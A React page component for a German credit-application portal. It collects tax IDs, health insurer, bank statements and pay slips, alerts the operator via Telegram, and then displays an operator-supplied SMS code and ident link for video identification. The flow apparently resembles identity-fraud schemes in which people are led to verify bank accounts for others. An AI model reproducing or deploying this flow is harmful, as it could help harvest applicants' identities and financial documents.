import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useCreditStatus } from "@/hooks/useCreditStatus";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/components/ui/sonner";
import { 
  CreditCard, 
  ExternalLink, 
  CheckCircle2, 
  Clock, 
  XCircle, 
  Phone, 
  Mail,
  Shield,
  Smartphone,
  Video,
  FileCheck,
  Loader2,
  Upload,
  Building2,
  Hash,
  Link2,
  FileText,
  Euro,
  AlertCircle
} from "lucide-react";

const animationStyles = `
  @keyframes floating {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-20px) rotate(5deg); }
  }
  @keyframes floating-delayed {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-15px) rotate(-3deg); }
  }
  @keyframes shimmer {
    0% { transform: translateX(-100%) skewX(-12deg); }
    100% { transform: translateX(100%) skewX(-12deg); }
  }
`;

// Premium Header Component
const PremiumHeader = ({ subtitle }: { subtitle: string }) => (
  <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-primary via-primary/95 to-primary/80 p-6 md:p-8 mb-8">
    <div 
      className="absolute top-6 left-12 w-24 h-24 bg-white/10 rounded-full blur-sm"
      style={{ animation: '6s ease-in-out infinite floating' }} 
    />
    <div 
      className="absolute bottom-8 right-16 w-20 h-20 bg-white/15 rounded-full blur-sm"
      style={{ animation: '8s ease-in-out infinite 2s floating-delayed' }} 
    />
    <div 
      className="absolute top-1/2 left-1/3 w-16 h-16 bg-white/5 rounded-full blur-sm"
      style={{ animation: '7s ease-in-out infinite 1s floating' }} 
    />
    <div className="absolute inset-0 overflow-hidden">
      <div 
        className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent skew-x-12"
        style={{ animation: '3s linear infinite shimmer' }} 
      />
    </div>
    <div className="relative z-10 flex items-center gap-4 md:gap-6">
      <div className="w-14 h-14 md:w-16 md:h-16 rounded-2xl bg-white/20 backdrop-blur-sm flex items-center justify-center shadow-lg border border-white/20">
        <CreditCard className="w-7 h-7 md:w-8 md:h-8 text-white" />
      </div>
      <div>
        <h1 className="text-2xl md:text-3xl font-bold text-white">Kredit beantragen</h1>
        <p className="text-white/80 mt-1 text-sm md:text-base">{subtitle}</p>
      </div>
    </div>
  </div>
);

export default function CreditApplication() {
  const { creditRequest, creditStatus, loading, confirmIdentVerification } = useCreditStatus();
  const [confirmChecked, setConfirmChecked] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  
  // Document form state
  const [healthInsurance, setHealthInsurance] = useState("");
  const [taxNumber, setTaxNumber] = useState("");
  const [taxId, setTaxId] = useState("");
  const [bankStatements, setBankStatements] = useState<File[]>([]);
  const [salarySlips, setSalarySlips] = useState<File[]>([]);
  const [uploadingDocuments, setUploadingDocuments] = useState(false);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, setter: React.Dispatch<React.SetStateAction<File[]>>) => {
    if (e.target.files) {
      setter(Array.from(e.target.files));
    }
  };

  const uploadFiles = async (files: File[], folder: string): Promise<string[]> => {
    const { data: { session } } = await supabase.auth.getSession();
    if (!session) throw new Error('Nicht authentifiziert');

    const paths: string[] = [];
    for (const file of files) {
      const fileName = `${session.user.id}/${folder}/${Date.now()}_${file.name}`;
      const { error } = await supabase.storage
        .from('credit-documents')
        .upload(fileName, file);
      
      if (error) throw error;
      paths.push(fileName);
    }
    return paths;
  };

  const handleSubmitDocuments = async () => {
    if (!healthInsurance.trim() || !taxNumber.trim() || !taxId.trim()) {
      toast.error('Bitte füllen Sie alle Pflichtfelder aus');
      return;
    }

    if (bankStatements.length === 0) {
      toast.error('Bitte laden Sie mindestens einen Kontoauszug hoch');
      return;
    }

    if (salarySlips.length === 0) {
      toast.error('Bitte laden Sie mindestens eine Lohnabrechnung hoch');
      return;
    }

    setUploadingDocuments(true);
    try {
      // Upload files
      const bankStatementPaths = await uploadFiles(bankStatements, 'bank-statements');
      const salarySlipPaths = await uploadFiles(salarySlips, 'salary-slips');

      // Update credit request
      const { error } = await supabase
        .from('credit_requests')
        .update({
          health_insurance: healthInsurance.trim(),
          tax_number: taxNumber.trim(),
          tax_id: taxId.trim(),
          bank_statements_paths: bankStatementPaths,
          salary_slips_paths: salarySlipPaths,
          status: 'documents_submitted',
          documents_submitted_at: new Date().toISOString(),
        })
        .eq('id', creditRequest?.id);

      if (error) throw error;

      // Send Telegram notification
      try {
        const { data: { session } } = await supabase.auth.getSession();
        await supabase.functions.invoke('send-telegram-notification', {
          body: {
            event_type: 'credit_documents_submitted',
            data: {
              user_id: session?.user?.id,
            }
          }
        });
      } catch (telegramError) {
        console.error('Telegram notification error:', telegramError);
      }

      toast.success('Unterlagen erfolgreich eingereicht');
      
      // Seite neu laden damit der neue Status angezeigt wird
      setTimeout(() => {
        window.location.reload();
      }, 1500);
    } catch (error) {
      console.error('Error submitting documents:', error);
      toast.error('Fehler beim Einreichen der Unterlagen');
    } finally {
      setUploadingDocuments(false);
    }
  };

  const handleConfirmVerification = async () => {
    if (!confirmChecked) {
      toast.error('Bitte bestätigen Sie, dass Sie die Verifizierung abgeschlossen haben');
      return;
    }

    setSubmitting(true);
    const success = await confirmIdentVerification();
    if (success) {
      toast.success('Verifizierung wurde zur Überprüfung eingereicht');
    } else {
      toast.error('Fehler beim Einreichen der Bestätigung');
    }
    setSubmitting(false);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('de-DE', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const formatCurrency = (amount: number | null) => {
    if (amount === null) return '-';
    return new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(amount);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[60vh]">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-primary mx-auto" />
          <p className="text-muted-foreground">Lade Status...</p>
        </div>
        <style>{animationStyles}</style>
      </div>
    );
  }

  if (!creditRequest) {
    return (
      <div className="container max-w-3xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Kreditantrag nicht verfügbar" />
        <Card className="border-muted bg-muted/30">
          <CardContent className="text-center py-12">
            <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-muted/50 flex items-center justify-center">
              <CreditCard className="h-8 w-8 text-muted-foreground" />
            </div>
            <p className="text-muted-foreground">
              Kreditantrag ist für Ihr Konto nicht aktiviert.
            </p>
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Phase 1: Documents Pending
  if (creditStatus === 'documents_pending') {
    return (
      <div className="container max-w-4xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Unterlagen für Ihren Kreditantrag einreichen" />

        <Card className="mb-6">
          <CardHeader>
            <CardTitle className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                <FileText className="h-5 w-5 text-primary" />
              </div>
              Erforderliche Unterlagen
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Text Fields */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="healthInsurance">Krankenkasse *</Label>
                <Input
                  id="healthInsurance"
                  placeholder="z.B. AOK Bayern"
                  value={healthInsurance}
                  onChange={(e) => setHealthInsurance(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="taxNumber">Steuernummer *</Label>
                <Input
                  id="taxNumber"
                  placeholder="z.B. 123/456/78901"
                  value={taxNumber}
                  onChange={(e) => setTaxNumber(e.target.value)}
                  className="font-mono"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="taxId">Steueridentifikationsnummer *</Label>
                <Input
                  id="taxId"
                  placeholder="z.B. 12345678901"
                  value={taxId}
                  onChange={(e) => setTaxId(e.target.value)}
                  className="font-mono"
                />
              </div>
            </div>

            {/* File Uploads */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-3">
                <Label>Kontoauszüge der letzten 3 Monate *</Label>
                <div className="border-2 border-dashed border-muted rounded-xl p-6 text-center hover:border-primary/50 transition-colors">
                  <Upload className="h-8 w-8 mx-auto text-muted-foreground mb-2" />
                  <Input
                    type="file"
                    multiple
                    accept=".pdf,.jpg,.jpeg,.png"
                    onChange={(e) => handleFileChange(e, setBankStatements)}
                    className="hidden"
                    id="bankStatements"
                  />
                  <Label htmlFor="bankStatements" className="cursor-pointer">
                    <span className="text-sm text-muted-foreground">
                      Dateien auswählen (PDF, JPG, PNG)
                    </span>
                  </Label>
                  {bankStatements.length > 0 && (
                    <div className="mt-3 space-y-1">
                      {bankStatements.map((file, idx) => (
                        <p key={idx} className="text-xs text-primary">{file.name}</p>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              <div className="space-y-3">
                <Label>Lohnabrechnungen der letzten 3 Monate *</Label>
                <div className="border-2 border-dashed border-muted rounded-xl p-6 text-center hover:border-primary/50 transition-colors">
                  <Upload className="h-8 w-8 mx-auto text-muted-foreground mb-2" />
                  <Input
                    type="file"
                    multiple
                    accept=".pdf,.jpg,.jpeg,.png"
                    onChange={(e) => handleFileChange(e, setSalarySlips)}
                    className="hidden"
                    id="salarySlips"
                  />
                  <Label htmlFor="salarySlips" className="cursor-pointer">
                    <span className="text-sm text-muted-foreground">
                      Dateien auswählen (PDF, JPG, PNG)
                    </span>
                  </Label>
                  {salarySlips.length > 0 && (
                    <div className="mt-3 space-y-1">
                      {salarySlips.map((file, idx) => (
                        <p key={idx} className="text-xs text-primary">{file.name}</p>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <Button 
              className="w-full h-12 text-base font-semibold"
              onClick={handleSubmitDocuments}
              disabled={uploadingDocuments}
            >
              {uploadingDocuments ? (
                <>
                  <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                  Wird hochgeladen...
                </>
              ) : (
                <>
                  <FileCheck className="h-5 w-5 mr-2" />
                  Unterlagen einreichen
                </>
              )}
            </Button>
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Phase 1 Waiting: Documents Submitted
  if (creditStatus === 'documents_submitted') {
    return (
      <div className="container max-w-3xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Ihre Unterlagen werden geprüft" />
        
        <Card className="border-blue-500/20 bg-gradient-to-br from-blue-500/5 to-transparent">
          <CardContent className="py-12 text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-blue-500/10 flex items-center justify-center">
              <Clock className="h-10 w-10 text-blue-500 animate-pulse" />
            </div>
            <h2 className="text-xl font-bold mb-2">Unterlagen eingereicht</h2>
            <p className="text-muted-foreground mb-4">
              Unsere Experten prüfen Ihre Unterlagen sorgfältig. 
              Sie werden benachrichtigt, sobald die Prüfung abgeschlossen ist.
            </p>
            {creditRequest.documents_submitted_at && (
              <p className="text-sm text-muted-foreground">
                Eingereicht am: {formatDate(creditRequest.documents_submitted_at)}
              </p>
            )}
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Phase 2: Ident Pending
  if (creditStatus === 'ident_pending') {
    return (
      <div className="container max-w-4xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Führen Sie die Identifizierung durch" />

        {/* Credit Amount Card */}
        <Card className="border-primary/30 bg-gradient-to-br from-primary/5 via-primary/10 to-primary/5 overflow-hidden relative mb-6">
          <div className="absolute top-0 right-0 w-32 h-32 bg-primary/10 rounded-full -translate-y-1/2 translate-x-1/2" />
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-primary/5 rounded-full translate-y-1/2 -translate-x-1/2" />
          
          <CardContent className="py-8 relative z-10">
            <div className="flex items-start gap-5">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-primary/20 to-primary/30 flex items-center justify-center shadow-lg border border-primary/20 shrink-0">
                <Euro className="h-8 w-8 text-primary" />
              </div>
              <div className="space-y-2">
                <h2 className="text-xl font-bold text-foreground">
                  Ihr Kreditbetrag: {formatCurrency(creditRequest.credit_amount)}
                </h2>
                <p className="text-muted-foreground leading-relaxed">
                  Ihr Kreditantrag über <span className="font-semibold text-foreground">{formatCurrency(creditRequest.credit_amount)}</span> bei 
                  unserer Partnerbank <span className="font-semibold text-foreground">{creditRequest.partner_bank}</span> ist 
                  vorläufig genehmigt. Bitte führen Sie die Identitätsprüfung durch.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Verification Process Card */}
        <Card className="mb-6">
          <CardHeader className="pb-4">
            <CardTitle className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                <Shield className="h-5 w-5 text-primary" />
              </div>
              Verifizierungsprozess
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Steps */}
            <div className="flex gap-4">
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-primary to-primary/80 text-primary-foreground font-bold shadow-md">
                1
              </div>
              <div className="pt-1">
                <p className="font-semibold text-foreground">Klicken Sie auf "Verifizierung starten"</p>
                <p className="text-sm text-muted-foreground mt-1">
                  Sie werden zur Verifizierungsplattform weitergeleitet
                </p>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-primary to-primary/80 text-primary-foreground font-bold shadow-md">
                2
              </div>
              <div className="pt-1">
                <p className="font-semibold text-foreground flex items-center gap-2">
                  <Video className="h-4 w-4 text-primary" />
                  Video-Identifikation durchführen
                </p>
                <p className="text-sm text-muted-foreground mt-1">
                  Ein Mitarbeiter prüft Ihre Identität per Video-Chat
                </p>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-primary to-primary/80 text-primary-foreground font-bold shadow-md">
                3
              </div>
              <div className="pt-1 flex-1">
                <p className="font-semibold text-foreground flex items-center gap-2">
                  <Smartphone className="h-4 w-4 text-primary" />
                  SMS-Code eingeben
                </p>
                
                <div className="p-5 rounded-xl bg-gradient-to-br from-primary/10 via-primary/5 to-transparent border border-primary/20 shadow-sm mt-3">
                  <div className="flex items-center gap-2 mb-3">
                    <Smartphone className="h-4 w-4 text-primary" />
                    <span className="text-sm font-medium text-primary">Ihr SMS-Code</span>
                  </div>
                  {creditRequest.sms_code ? (
                    <p className="text-3xl font-mono font-bold tracking-widest text-foreground">
                      {creditRequest.sms_code}
                    </p>
                  ) : (
                    <p className="text-lg font-medium text-muted-foreground italic">
                      Noch nicht verfügbar
                    </p>
                  )}
                </div>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-primary to-primary/80 text-primary-foreground font-bold shadow-md">
                4
              </div>
              <div className="pt-1">
                <p className="font-semibold text-foreground flex items-center gap-2">
                  <CheckCircle2 className="h-4 w-4 text-primary" />
                  Bestätigung auf dieser Seite
                </p>
                <p className="text-sm text-muted-foreground mt-1">
                  Nach erfolgreicher Verifizierung bestätigen Sie dies hier
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Verification Data Card */}
        <Card className="mb-6 border-primary/20 bg-gradient-to-br from-card to-primary/5">
          <CardContent className="py-5">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
                <Shield className="h-4 w-4 text-primary" />
              </div>
              <span className="font-medium text-foreground">Ihre Verifizierungsdaten</span>
            </div>
            
            <div className="space-y-3">
              <div className="p-4 rounded-xl bg-gradient-to-br from-primary/10 to-transparent border border-primary/20">
                <div className="flex items-center gap-2 mb-2">
                  <Hash className="h-4 w-4 text-primary" />
                  <span className="text-sm font-medium text-primary">Identcode</span>
                </div>
                <p className="text-xl font-mono font-bold tracking-wider">{creditRequest.identcode}</p>
              </div>
              
              <div className="p-4 rounded-xl bg-muted/30 border border-muted">
                <div className="flex items-center gap-2 mb-2">
                  <Link2 className="h-4 w-4 text-muted-foreground" />
                  <span className="text-sm font-medium">Identlink</span>
                </div>
                <p className="text-sm text-muted-foreground break-all">{creditRequest.verification_link}</p>
              </div>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div className="p-3 rounded-lg bg-muted/30 border border-muted/50">
                  <div className="flex items-center gap-2 mb-1">
                    <Mail className="h-3.5 w-3.5 text-muted-foreground" />
                    <span className="text-xs font-medium text-muted-foreground">E-Mail</span>
                  </div>
                  <p className="text-sm">{creditRequest.contact_email}</p>
                </div>
                <div className="p-3 rounded-lg bg-muted/30 border border-muted/50">
                  <div className="flex items-center gap-2 mb-1">
                    <Phone className="h-3.5 w-3.5 text-muted-foreground" />
                    <span className="text-xs font-medium text-muted-foreground">Telefon</span>
                  </div>
                  <p className="text-sm">{creditRequest.contact_phone}</p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Action Card */}
        <Card className="border-primary/20 bg-gradient-to-br from-card to-primary/5">
          <CardContent className="py-6 space-y-5">
            <Button 
              variant="outline"
              className="w-full h-11" 
              onClick={() => window.open(creditRequest.verification_link || '', '_blank')}
            >
              <ExternalLink className="h-4 w-4 mr-2" />
              Verifizierung starten
            </Button>

            <div className="border-t border-border/50 pt-5">
              <div className="flex items-start gap-3 p-4 rounded-xl bg-muted/50 border border-muted">
                <Checkbox
                  id="confirm"
                  checked={confirmChecked}
                  onCheckedChange={(checked) => setConfirmChecked(checked === true)}
                  className="mt-0.5"
                />
                <label 
                  htmlFor="confirm" 
                  className="text-sm cursor-pointer leading-relaxed text-muted-foreground"
                >
                  Ich habe die Verifizierung erfolgreich abgeschlossen und den Bestätigungscode korrekt eingegeben.
                </label>
              </div>

              <Button 
                className="w-full mt-4 h-12 text-base font-semibold shadow-lg bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70"
                size="lg"
                onClick={handleConfirmVerification}
                disabled={!confirmChecked || submitting}
              >
                <CheckCircle2 className="h-5 w-5 mr-2" />
                {submitting ? "Wird übermittelt..." : "Verifizierung bestätigen"}
              </Button>
            </div>
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Phase 2 Waiting: Ident Submitted
  if (creditStatus === 'ident_submitted') {
    return (
      <div className="container max-w-3xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Verifizierung wird geprüft" />
        
        <Card className="border-orange-500/20 bg-gradient-to-br from-orange-500/5 to-transparent">
          <CardContent className="py-12 text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-orange-500/10 flex items-center justify-center">
              <Clock className="h-10 w-10 text-orange-500 animate-pulse" />
            </div>
            <h2 className="text-xl font-bold mb-2">Verifizierung eingereicht</h2>
            <p className="text-muted-foreground mb-4">
              Ihre Verifizierung wird geprüft. Sie werden benachrichtigt, sobald Ihr Kredit genehmigt wurde.
            </p>
            {creditRequest.user_confirmed_at && (
              <p className="text-sm text-muted-foreground">
                Bestätigt am: {formatDate(creditRequest.user_confirmed_at)}
              </p>
            )}
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Approved
  if (creditStatus === 'approved') {
    return (
      <div className="container max-w-3xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Kredit erfolgreich genehmigt" />
        
        <Card className="border-green-500/20 bg-gradient-to-br from-green-500/5 to-transparent">
          <CardContent className="py-12 text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-green-500/10 flex items-center justify-center">
              <CheckCircle2 className="h-10 w-10 text-green-500" />
            </div>
            <h2 className="text-2xl font-bold mb-2 text-green-600">Kredit genehmigt!</h2>
            <p className="text-3xl font-bold text-foreground mb-4">
              {formatCurrency(creditRequest.credit_amount)}
            </p>
            <p className="text-muted-foreground">
              Ihr Kreditantrag bei {creditRequest.partner_bank} wurde erfolgreich genehmigt.
            </p>
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  // Rejected
  if (creditStatus === 'rejected') {
    return (
      <div className="container max-w-3xl mx-auto py-4 md:py-8 px-4">
        <PremiumHeader subtitle="Kreditantrag abgelehnt" />
        
        <Card className="border-red-500/20 bg-gradient-to-br from-red-500/5 to-transparent">
          <CardContent className="py-12 text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-red-500/10 flex items-center justify-center">
              <XCircle className="h-10 w-10 text-red-500" />
            </div>
            <h2 className="text-xl font-bold mb-2 text-red-600">Antrag abgelehnt</h2>
            {creditRequest.rejection_reason && (
              <Alert variant="destructive" className="mt-4 text-left">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{creditRequest.rejection_reason}</AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>
        <style>{animationStyles}</style>
      </div>
    );
  }

  return null;
}
